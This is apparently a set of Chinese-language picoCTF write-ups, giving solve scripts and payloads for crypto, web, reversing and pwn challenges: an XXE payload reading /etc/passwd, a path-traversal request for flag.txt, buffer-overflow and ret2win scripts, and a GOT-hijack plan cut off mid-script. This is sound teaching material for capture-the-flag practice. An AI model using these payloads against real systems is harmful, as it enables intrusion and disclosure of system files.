Exploit Script\nfrom Crypto.Util.number import inverse, long_to_bytes x = int(\u0026#34;152a1447b61d023bebab7b1f8bc9d934c2d4b0c8ef7e211dbbcf841136d030e3c829f222cec318f6f624eb529b54bcda848f65574896d70cd6c3460d0c9064cd66e826578c2035ab63da67d069fa302227a9012422d2402f8f0d4495ef66104ebd774f341aa62f493184301debf910ab3d1e72e357a99c460370254f3dfccd9ae\u0026#34;, 16) n = int(\u0026#34;6fc1b2be753e8f480c8b7576f77d3063906a6a024fe954d7fd01545e8f5b6becc24d70e9a5bc034a4c00e61f8a6176feb7d35fe39c8c03617ea4552840d93aa09469716913b58df677c785cd7633d1b7d31e2222cab53be235aa412ac5c5b07b500cf3fd5d6b91e2ddc51bff1e6eec2cb68723af668df36e10e332a9cbb7f3e2df9593fa0e553ed58afec2aa3bc4ae8ef1140e4779f61bdeae4c0b46136294cf151622e83c3d71b97c815b542208baa28207225f134c5a4feac998aeb178a5552f08643717819c10e8b5ec7715696c3bf4434fbea8e8a516dfd90046a999e24a0fb10d27291eb29ef3f285149c20189e7d0190417991094948180196543b8c91\u0026#34;, 16) c = int(\u0026#34;16acf84a73cefd321ed491a15c640a495b09050cdce435ec37442faf9a694775e1ebffb6dbad6133cbc54e3f641506b0613f711625594fcb467f915f2708714b4c9936f5f4752c3299157cff4eb68eb82c0054dae351314829974f4feadaf126cda92b97e348dbef2640ec3a729a064e615df73d644700f93bf87579683e253d29622525bea3644f59aac8e0b2553bfea48d99e9b323e03cbf55166659974eb8c51cc7b2c2c5d6aa6c01b056a8ed7283d96656a3496f266726605af1be139d586f208d4d7c59c2771dc8036d490d3672ee4513301002775d7c39eac421c6cb4f01344e061549a4cb11c057accef1726572e447501004c772ec91b4a55811280f\u0026#34;, 16) e = 65537 phi = n - x + 1 d = inverse(e, phi) print(long_to_bytes(pow(c, d, n))) :::\nChallenge: b00tl3gRSA3🍰 # Recon # Description: Why use p and q when I can use more? Hint: There\u0026rsquo;s more prime factors than p and q, finding d is going to be different. 和這題幾乎一樣 Exploit - Smooth Value # 先用online tool n = 9391862407×9430502773×10075292329×11026721677×11040417907×11226344687×11251922861×11323087873×11823788947×11956868381×11988198241×12275776127×12481146047×12665684987×12913613113×13994049331×14050490287×14654363873×15023405711×15220261411×15307561417×15368817697×15407160677×15542678147×15597563977×15670906213×15937323977×16033412617×16069849819×16364771063×16708525877×16824901871×16945613717×16989252559 寫Script from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse p_q_factor = [9391862407,9430502773,10075292329,11026721677,11040417907,11226344687,11251922861,11323087873,11823788947,11956868381,11988198241,12275776127,12481146047,12665684987,12913613113,13994049331,14050490287,14654363873,15023405711,15220261411,15307561417,15368817697,15407160677,15542678147,15597563977,15670906213,15937323977,16033412617,16069849819,16364771063,16708525877,16824901871,16945613717,16989252559] c = 205177004615238731351591289040361532005323127359264835947822740716983136768854567377695810379804519529001108024493036086993996665747898010286174708794831060625006137526368615944348139474971845237186225728575712792546002359378966044221352721991288514552994761886718307832529541998738515780841823857133357743562860987020334737036728017641876582542 n = 325639898609361998216675485356547029510334941438608718141166837901883899013721165219381706028192734268885029193084232593567285725019760847868933043664019031900580901169223676044511691181256188001312697240016796398130516789089663998776488278420247724141996094725183171258977283897111350310752334184134343620555307982038647996863698517917545473309 e = 65537 phi = 1 for i in range(len(p_q_factor)): phi = (p_q_factor[i] - 1) * phi d = inverse(e, phi) print(long_to_bytes(pow(c, d, n))) Flag: b'picoCTF{too_many_fact0rs_8606199}'\nChallenge: SOAP🍰 # Exploit - The simplest XXE # Payload:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt;\u0026lt;data\u0026gt;\u0026lt;ID\u0026gt;\u0026amp;xxe;\u0026lt;/ID\u0026gt;\u0026lt;/data\u0026gt; Challenge: picobrowser🍰 # Exploit # 才剛寫完Who are you?就覺得案情不單純，只要把header User-Agent變成picobrowser就可以了\nFlag: picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}\nChallenge: Client-side-again🍰 # Exploit - Reverse Script # 一開始先recon一下，我用burp抓了一下packet，發現他是把密碼在local端做驗證，所以要做的就只是要有耐心的分析一下source code :::spoiler Source Code\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Secure Login Portal V2.0\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body background=\u0026#34;barbed_wire.jpeg\u0026#34; \u0026gt; \u0026lt;!-- standard MD5 implementation --\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;md5.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var str_list=[\u0026#39;f49bf}\u0026#39;,\u0026#39;_again_e\u0026#39;,\u0026#39;this\u0026#39;,\u0026#39;Password\\x20Verified\u0026#39;,\u0026#39;Incorrect\\x20password\u0026#39;,\u0026#39;getElementById\u0026#39;,\u0026#39;value\u0026#39;,\u0026#39;substring\u0026#39;,\u0026#39;picoCTF{\u0026#39;,\u0026#39;not_this\u0026#39;]; (function(_0x4bd822, _0x2bd6f7) { var _0xb4bdb3 = function(_0x1d68f6) { while (--_0x1d68f6) { _0x4bd822[\u0026#39;push\u0026#39;](_0x4bd822[\u0026#39;shift\u0026#39;]()); } }; _0xb4bdb3(++_0x2bd6f7); }(str_list, 435)); var _0x4b5b = function(var_1) { return str_list[var_1]; }; function verify() { checkpass = document[_0x4b5b(\u0026#39;0\u0026#39;)](\u0026#39;pass\u0026#39;)[_0x4b5b(\u0026#39;0x1\u0026#39;)]; if (checkpass[_0x4b5b(\u0026#39;0x2\u0026#39;)](0, 8) == _0x4b5b(\u0026#39;0x3\u0026#39;)) { if (checkpass[_0x4b5b(\u0026#39;0x2\u0026#39;)](7, 9) == \u0026#39;{n\u0026#39;) { if (checkpass[_0x4b5b(\u0026#39;0x2\u0026#39;)](8, 16) == _0x4b5b(\u0026#39;0x4\u0026#39;)) { if (checkpass[_0x4b5b(\u0026#39;0x2\u0026#39;)](3, 6) == \u0026#39;oCT\u0026#39;) { if (checkpass[_0x4b5b(\u0026#39;0x2\u0026#39;)](24, 32) == _0x4b5b(\u0026#39;0x5\u0026#39;)) { if (checkpass[\u0026#39;substring\u0026#39;](6, b) == \u0026#39;F{not\u0026#39;) { if (checkpass[_0x4b5b(\u0026#39;0x2\u0026#39;)](16, 24) == _0x4b5b(\u0026#39;0x6\u0026#39;)) { if (checkpass[_0x4b5b(\u0026#39;0x2\u0026#39;)](12, 16) == _0x4b5b(\u0026#39;0x7\u0026#39;)) { alert(_0x4b5b(\u0026#39;0x8\u0026#39;)); } } } } } } } } else { alert(_0x4b5b(\u0026#39;0x9\u0026#39;)); } } \u0026lt;/script\u0026gt; \u0026lt;div style=\u0026#34;position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;p\u0026gt;New and Improved Login\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Enter valid credentials to proceed\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;index.html\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;pass\u0026#34; size=\u0026#34;8\u0026#34; /\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;verify\u0026#34; onclick=\u0026#34;verify(); return false;\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\nFlag: picoCTF{not_this_again_ef49bf}\nChallenge: Forbidden Paths🍰 # Description:\nWe know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?\nExploit - Easy LFI # Payload: filename=../../../../flag.txt\u0026amp;read= Flag: picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}\nChallenge: keygenme🍰 # Source # :::spoiler IDA Main Function\n__int64 __fastcall main(int a1, char **a2, char **a3) { char input_key[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); printf(\u0026#34;Enter your license key: \u0026#34;); fgets(input_key, 37, stdin); if ( check_key(input_key) ) puts(\u0026#34;That key is valid.\u0026#34;); else puts(\u0026#34;That key is invalid.\u0026#34;); return 0LL; } ::: :::spoiler IDA Check Flag Function\n__int64 __fastcall check_key(const char *input_key) { int v2; // [rsp+18h] [rbp-C8h] int v3; // [rsp+18h] [rbp-C8h] int i; // [rsp+1Ch] [rbp-C4h] int j; // [rsp+20h] [rbp-C0h] int k; // [rsp+24h] [rbp-BCh] int m; // [rsp+28h] [rbp-B8h] char last_key[34]; // [rsp+2Eh] [rbp-B2h] BYREF char key[61]; // [rsp+50h] [rbp-90h] BYREF char v10; // [rsp+8Dh] [rbp-53h] char v11[72]; // [rsp+90h] [rbp-50h] BYREF unsigned __int64 v12; // [rsp+D8h] [rbp-8h] v12 = __readfsqword(0x28u); strcpy(key, \u0026#34;picoCTF{br1ng_y0ur_0wn_k3y_\u0026#34;); strcpy(last_key, \u0026#34;}\u0026#34;); strlen(key); MD5(); strlen(last_key); MD5(); v2 = 0; for ( i = 0; i \u0026lt;= 15; ++i ) { sprintf(\u0026amp;key[v2 + 32], \u0026#34;%02x\u0026#34;, last_key[i + 2]); v2 += 2; } v3 = 0; for ( j = 0; j \u0026lt;= 15; ++j ) { sprintf(\u0026amp;v11[v3], \u0026#34;%02x\u0026#34;, last_key[j + 18]); v3 += 2; } for ( k = 0; k \u0026lt;= 26; ++k ) v11[k + 32] = key[k]; v11[59] = key[45]; v11[60] = key[50]; v11[61] = v10; v11[62] = key[33]; v11[63] = key[46]; v11[64] = key[56]; v11[65] = key[58]; v11[66] = v10; v11[67] = last_key[0]; if ( strlen(input_key) != 36 ) return 0LL; for ( m = 0; m \u0026lt;= 35; ++m ) { if ( input_key[m] != v11[m + 32] ) return 0LL; } return 1LL; } :::\nExploit # 直接動態跑到最後看memory就會知道key是picoCTF{br1ng_y0ur_0wn_k3y_19836cd8} Challenge: basic-file-exploit:-1: # Background # strtol - c\nSource Code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define WAIT 60 static const char* flag = \u0026#34;[REDACTED]\u0026#34;; static char data[10][100]; static int input_lengths[10]; static int inputs = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if( l \u0026lt;= 0 ) { printf(\u0026#34;\u0026#39;l\u0026#39; for tgetinput must be greater than 0\\n\u0026#34;); return -2; } /* Empty the FD Set */ FD_ZERO(\u0026amp;input_set ); /* Listen to the input descriptor */ FD_SET(STDIN_FILENO, \u0026amp;input_set); /* Waiting for some seconds */ timeout.tv_sec = WAIT; // WAIT seconds timeout.tv_usec = 0; // 0 milliseconds /* Listening for input stream for any activity */ ready_for_reading = select(1, \u0026amp;input_set, NULL, NULL, \u0026amp;timeout); /* Here, first parameter is number of FDs in the set, * second is our FD set for reading, * third is the FD set in which any write activity needs to updated, * which is not required in this case. * Fourth is timeout */ if (ready_for_reading == -1) { /* Some error has occured in input */ printf(\u0026#34;Unable to read your input\\n\u0026#34;); return -1; } if (ready_for_reading) { read_bytes = read(0, input, l-1); if(input[read_bytes-1]==\u0026#39;\\n\u0026#39;){ --read_bytes; input[read_bytes]=\u0026#39;\\0\u0026#39;; } if(read_bytes==0){ printf(\u0026#34;No data given.\\n\u0026#34;); return -4; } else { return 0; } } else { printf(\u0026#34;Timed out waiting for user input. Press Ctrl-C to disconnect\\n\u0026#34;); return -3; } return 0; } static void data_write() { char input[100]; char len[4]; long length; int r; printf(\u0026#34;Please enter your data:\\n\u0026#34;); r = tgetinput(input, 100); // Timeout on user input if(r == -3) { printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); } while (true) { printf(\u0026#34;Please enter the length of your data:\\n\u0026#34;); r = tgetinput(len, 4); // Timeout on user input if(r == -3) { printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); } if ((length = strtol(len, NULL, 10)) == 0) { puts(\u0026#34;Please put in a valid length\u0026#34;); } else { break; } } if (inputs \u0026gt; 10) { inputs = 0; } strcpy(data[inputs], input); input_lengths[inputs] = length; printf(\u0026#34;Your entry number is: %d\\n\u0026#34;, inputs + 1); inputs++; } static void data_read() { char entry[4]; long entry_number; char output[100]; int r; memset(output, \u0026#39;\\0\u0026#39;, 100); printf(\u0026#34;Please enter the entry number of your data:\\n\u0026#34;); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) { printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); } if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); } entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output); } int main(int argc, char** argv) { char input[3] = {\u0026#39;\\0\u0026#39;}; long command; int r; puts(\u0026#34;Hi, welcome to my echo chamber!\u0026#34;); puts(\u0026#34;Type \u0026#39;1\u0026#39; to enter a phrase into our database\u0026#34;); puts(\u0026#34;Type \u0026#39;2\u0026#39; to echo a phrase in our database\u0026#34;); puts(\u0026#34;Type \u0026#39;3\u0026#39; to exit the program\u0026#34;); while (true) { r = tgetinput(input, 3); // Timeout on user input if(r == -3) { printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); } if ((command = strtol(input, NULL, 10)) == 0) { puts(\u0026#34;Please put in a valid number\u0026#34;); } else if (command == 1) { data_write(); puts(\u0026#34;Write successful, would you like to do anything else?\u0026#34;); } else if (command == 2) { if (inputs == 0) { puts(\u0026#34;No data yet\u0026#34;); continue; } data_read(); puts(\u0026#34;Read successful, would you like to do anything else?\u0026#34;); } else if (command == 3) { return 0; } else { puts(\u0026#34;Please type either 1, 2 or 3\u0026#34;); puts(\u0026#34;Maybe breaking boundaries elsewhere will be helpful\u0026#34;); } } return 0; } :::\nRecon # 這一題感覺真的不像PWN題，比較像是reverse\n注意讀取flag的地方是在data_read()的地方，且entry要是零 我一開始的想法是往回推，所以要進到data_read()一開始的input就要選2，但會得到No data yet的結果，原因是input變數還是零(一開始的global variable有定義initia l value) 所以現在必須要想如何才能改變input variable的變數，答案就是data_write()，當寫入字串成功時會在這個function的最後給予一個entry，其實就是input++得來的，所以我們要做的事情就是 先寫任意的數值的database $\\to$ 進入data_read()讀取entry 0的data Exploit - Reverse Carefully # nc saturn.picoctf.net 65317 Hi, welcome to my echo chamber! Type \u0026#39;1\u0026#39; to enter a phrase into our database Type \u0026#39;2\u0026#39; to echo a phrase in our database Type \u0026#39;3\u0026#39; to exit the program 1 1 Please enter your data: 123 123 Please enter the length of your data: 3 3 Your entry number is: 1 Write successful, would you like to do anything else? 2 2 Please enter the entry number of your data: 0 0 picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942} Challenge: buffer overflow 0🍰 # Source Code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #define FLAGSIZE_MAX 64 char flag[FLAGSIZE_MAX]; void sigsegv_handler(int sig) { printf(\u0026#34;%s\\n\u0026#34;, flag); fflush(stdout); exit(1); } void vuln(char *input){ char buf2[16]; strcpy(buf2, input); } int main(int argc, char **argv){ FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(flag,FLAGSIZE_MAX,f); signal(SIGSEGV, sigsegv_handler); // Set up signal handler gid_t gid = getegid(); setresgid(gid, gid, gid); printf(\u0026#34;Input: \u0026#34;); fflush(stdout); char buf1[100]; gets(buf1); vuln(buf1); printf(\u0026#34;The program will exit now\\n\u0026#34;); return 0; } :::\nRecon # 這一題比想像中簡單，算是給新手認識BoF的機會，可以看到source code中寫到只要觸發segmentation fault就會轉給sigsegv_handler這個function把flag印出來，而會遇到segmentation fault的地方就是第18行的strcpy function，只要給的input length大於buf2就會產生\nExploit - Simple BoF # $ nc saturn.picoctf.net 51532 Input: aaaaaaaaaaaaaaaaaaaa picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58} 實測需要輸入20個字元才會觸發\nChallenge: clutter-overflow🍰 # Recon # 應該算是最簡單的BoF，可以用靜態或是動態的方式觀察offset有多少，然後把code的地方蓋成0xdeadbeef就可以拿到flag了\nExploit # from pwn import * # r = process(\u0026#39;chall\u0026#39;) r = remote(\u0026#34;mars.picoctf.net\u0026#34;, 31890) r.recvuntil(b\u0026#39;What do you see?\\n\u0026#39;) r.sendline(b\u0026#39;a\u0026#39; * (0x110-0x8) + p64(0xdeadbeef)) r.interactive() Flag: picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}\nChallenge: wine:-1: # Recon # 這題很爛的原因是明明很簡單，但是用pwntools寫script卻沒辦法成功，但payload是一樣的，我有想過要用python -c的方式pipe out給server但一樣不成功，不知道為甚麼，看了其他人的WP也有提到一樣的問題，搞得我好亂啊啊啊啊啊啊啊!!!\n(23/8/4)更新:打windows的題目要把new line改成\\r\\n，所以才會沒有成功\nExploit # :::spoiler\n$ echo \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\\x15@\\x00\u0026#34; | nc saturn.picoctf.net 50417 Give me a string! picoCTF{Un_v3rr3_d3_v1n_dcc38bed} Unhandled exception: page fault on read access to 0x7fec3900 in 32-bit code (0x7fec3900). Register dump: CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063 EIP:7fec3900 ESP:0064fe84 EBP:61616161 EFLAGS:00010206( R- -- I - -P- ) EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4 ESI:00000005 EDI:0021d6d0 Stack dump: 0x0064fe84: 00000000 00000004 00000000 7b432ecc 0x0064fe94: 00230e78 0064ff28 00401386 00000002 0x0064fea4: 00230e70 006d0da0 7bcc4625 00000004 0x0064feb4: 00000008 00230e70 0021d6d0 0077ccf9 0x0064fec4: 28364527 00000000 00000000 00000000 0x0064fed4: 00000000 00000000 00000000 00000000 Backtrace: =\u0026gt;0 0x7fec3900 (0x61616161) 0x7fec3900: addb %al,0x0(%eax) Modules: Module Address Debug info Name (5 modules) PE 400000- 44b000 Deferred vuln PE 7b020000-7b023000 Deferred kernelbase PE 7b420000-7b5db000 Deferred kernel32 PE 7bc30000-7bc34000 Deferred ntdll PE 7fe10000-7fe14000 Deferred msvcrt Threads: process tid prio (all id:s are in hex) 00000008 vuln.exe 00000009 0 0000000c services.exe 0000000e 0 0000000d 0 0000001f (D) Z:\\challenge\\vuln.exe 00000020 0 \u0026lt;== 00000024 explorer.exe 00000025 0 System information: Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1) Platform: i386 Version: Windows Server 2008 R2 Host system: Linux Host version: 5.19.0-1024-aws ::: (23/8/4)更新:New Exploit\nfrom pwn import * r = remote(\u0026#34;saturn.picoctf.net\u0026#34;, 53396) # r = process(\u0026#34;./vuln.exe\u0026#34;) r.recvline() context.newline = b\u0026#39;\\r\\n\u0026#39; payload = b\u0026#39;a\u0026#39;*0x8c + p32(0x401530) r.sendline(payload) r.interactive() Flag: picoCTF{Un_v3rr3_d3_v1n_dcc38bed}\nChallenge: Local Target🍰 # Recon # 這一題超簡單，不知道為啥超少人解，就只是蓋掉原本的num變成65而已\nExploit - Array Bound # $ echo \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaA\u0026#34; | nc saturn.picoctf.net 57591 Enter a string: num is 65 You win! picoCTF{l0c4l5_1n_5c0p3_fee8ef05} Flag: picoCTF{l0c4l5_1n_5c0p3_fee8ef05}\nChallenge: Picker IV🍰 # Recon # 這一題也是超簡單但是不知道為啥也很少人解，單純的return 2 series\n$ file picker-IV picker-IV: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=12b33c5ff389187551aae5774324da558cee006c, for GNU/Linux 3.2.0, not stripped $ checksec picker-IV [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/Picker IV/picker-IV\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) $ objdump -d -M intel ./picker-IV | grep \u0026#34;win\u0026#34; 000000000040129e \u0026lt;win\u0026gt;: 4012d2: 75 16 jne 4012ea \u0026lt;win+0x4c\u0026gt; 4012f9: eb 1a jmp 401315 \u0026lt;win+0x77\u0026gt; 401319: 75 e0 jne 4012fb \u0026lt;win+0x5d\u0026gt; Exploit - Ret2Funcntion # $ echo \u0026#34;40129e\u0026#34; | nc saturn.picoctf.net 50048 Enter the address in hex to jump to, excluding \u0026#39;0x\u0026#39;: You input 0x40129e You won! picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61} Flag: picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}\nChallenge: Hurry up! Wait!🍰 # Recon \u0026amp; Prepare # $ file svchost.exe svchost.exe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dea7ec3bad6aeab52804d2a614b132f4af2a1025, stripped $ checksec svchost.exe [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/Reverse/Hurry up! Wait!/svchost.exe\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 這一題唯一要注意的是可能會遇到\n$ ./svchost.exe ./svchost.exe: error while loading shared libraries: libgnat-7.so.1: cannot open shared object file: No such file or directory 這個問題，所以只要安裝libgnat-7就可以了\n$ sudo apt-get install -y libgnat-7 安裝完之後先執行看看，發現沒有任何output或是其他提示，所以用ida看了一下會發現他在main-\u0026gt;sub_298A()-\u0026gt;ada__calendar__delays__delay_for(1000000000000000LL);有檔一個delay，預期只要跳過這個地方就可以完成後續的step\nExploit # $ gdb svchost.exe gef➤ starti gef➤ vmmap # 先確認code section的base address在哪 gef➤ b *(0x555555400000+0x2998) gef➤ c gef➤ j *(0x555555400000+0x299d) 這樣就可以拿到flag Flag: picoCTF{d15a5m_ftw_87e5ab1}\nChallenge: droid0:-1: # Recon \u0026amp; Prepare # 這一題簡單到不可思議，難的地方是要想辦法把他run起來，不是指用android studio而是進入android studio之後，不確定是不是版本太舊或是其他原因他會一直噴錯，再加上是第一次使用這個工具，所以也不確定要看哪邊解決問題，所以如果有人遇到模擬器開不起來的狀況，可以看一下最右邊的notification，他會告訴你缺了甚麼，要不要安裝之類的簡單排除問題 Exploit # 在emulator上隨便打一些字，然後click button，只要查看底下的log就會看到flag了 Flag: picoCTF{a.moose.once.bit.my.sister}\nChallenge: WebNet1🍰 # Exploit - Import TLS Key / String Seach # 承接WebNet0，先import題目提供的private key解密中間所有的通訊，然後會看到中間有query一個網站，他提供了一張禿鷹的圖片，把圖片dump下來後直接string search就可以拿到flag\n$ strings vulture.jpg | grep pico picoCTF{honey.roasted.peanuts} Flag: picoCTF{honey.roasted.peanuts}\n"},{"id":257,"href":"/security/practice/picoctf/misc/flow/picoctf---eavesdrop/","title":"PicoCTF - Eavesdrop","section":"Securities","content":" PicoCTF - Eavesdrop # Recon # 這一題是有關eavesdropping，代表有一個中間人監聽了所有conversation，先用一些基本的手段看一下整體的pcap packets(strings searching/IO Graphs/Statistic/Extract Default Protocol File\u0026hellip;)，但是如果跟一下tcp的packets，可以發現傳輸兩方的對話紀錄，包括傳輸資料的加密方式等等，所以我們就可以直接把傳輸資料解密得到flag\nExploit - Extract File \u0026amp; Decrypt # Follow TCP Packets Hey, how do you decrypt this file again? You\u0026#39;re serious? Yeah, I\u0026#39;m serious *sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 Ok, great, thanks. Let\u0026#39;s use Discord next time, it\u0026#39;s more secure. C\u0026#39;mon, no one knows we use this program like this! Whatever. Hey. Yeah? Could you transfer the file to me again? Oh great. Ok, over 9002? Yeah, listening. Sent it Got it. You\u0026#39;re unbelievable 從以上對話紀錄可以知道他們在9002 port有傳輸資料，並且解密的command是openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 Extract File 我們可以增加兩個column專門顯示source/destination port 然後找到port 9002的地方，可以發現No.57有附帶資料，把這筆資料另存起來 Note: 儲存資料到file.des3的時候，內容必須要是Salted__9BæÄ'÷b4Ó[\u0014ÐNXämn±'-ärGsð\u001aÏú :›çk¿«@Û=6\u0016 Note2: 也可以用tcpflow的方式把資料download下來 $ sudo tcpflow -r {pcap file} Decrypt File $ openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. Flag: picoCTF{nc_73115_411_dd54ab67}\nReference # Restructuring PCAP Network Packets (PicoCTF 2022 #45 \u0026rsquo;eavesdrop\u0026rsquo;) "},{"id":258,"href":"/security/practice/picoctf/pwn/picoctf---fermat-strings/","title":"PicoCTF - fermat-strings","section":"Securities","content":" PicoCTF - fermat-strings # Background # C 庫函數 - strcspn()\n該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。\natoi() - C語言庫函數\n這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。\nC 库函数 - snprintf()\nsnprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \\0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \\0。\n需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \\0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \\0。\nFormat Specifiers in C\nSource code # :::spoiler\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;math.h\u0026gt; #define SIZE 0x100 int main(void) { char A[SIZE]; char B[SIZE]; int a = 0; int b = 0; puts(\u0026#34;Welcome to Fermat\\\\\u0026#39;s Last Theorem as a service\u0026#34;); setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); printf(\u0026#34;A: \u0026#34;); read(0, A, SIZE); printf(\u0026#34;B: \u0026#34;); read(0, B, SIZE); A[strcspn(A, \u0026#34;\\n\u0026#34;)] = 0; B[strcspn(B, \u0026#34;\\n\u0026#34;)] = 0; a = atoi(A); b = atoi(B); if(a == 0 || b == 0) { puts(\u0026#34;Error: could not parse numbers!\u0026#34;); return 1; } char buffer[SIZE]; snprintf(buffer, SIZE, \u0026#34;Calculating for A: %s and B: %s\\n\u0026#34;, A, B); printf(buffer); int answer = -1; for(int i = 0; i \u0026lt; 100; i++) { if(pow(a, 3) + pow(b, 3) == pow(i, 3)) { answer = i; } } if(answer != -1) printf(\u0026#34;Found the answer: %d\\n\u0026#34;, answer); } :::\nRecon # 這一題太難了，可以參考的資料太少了，大部分都有一些缺失，而且重點是server那邊的版本和local端不一樣就會造成got hijack失敗，所以最後沒有做出來，但是流程還是可以記錄一下\n先leak stack的資訊，例如__libc_start_main的address，然後到1查詢，光這一點耗費蠻多心力，雖然說只要查看stack上相對的位置，就可以leak出對應的address，但有可能是因為我local端libc version是2.35，所以找不到對應位置上libc address在database上的資料，但在server端卻找得到，這可能是不同版本的鍋，所以之後要找這種libc version的問題，最好是在2.31的地方 得到libc的version後，就可以算offset，得出libc base address，然後就可以得出system在libc的確切位址，又由於這隻程式只會執行一次就結束，所以我們要讓他有loop的效果，作法就是got hijack，改掉pow的got位置為main function的address 註：為甚麼是改pow而不是atoi, snprintf之類的function的got?因為pow是比較後面被呼叫到的function，如果修改那些太早被呼叫到的function就馬上從main開始執行，這樣就沒辦法開shell了 接著我們可以再從第二次的input中開shell，這就是最後做不出來的地方，除了之前沒有寫過相關的題目不知道怎麼開以外，其他WP234也都會有其他的問題 Exploit # from pwn import * exe = ELF(\u0026#34;chall\u0026#34;) libc = ELF(\u0026#34;./libc6_2.31-0ubuntu9.1_amd64.so\u0026#34;) context.binary = exe context.terminal = \u0026#34;kitty\u0026#34; offset___libc_start_main_ret = 0x026fc0 offset_system = 0x0000000000055410 # offset___libc_start_main_ret_local = 0xac0b3c2270 # offset_system_local = 0x050d60 r = remote(\u0026#34;mars.picoctf.net\u0026#34;, 31929) # r = 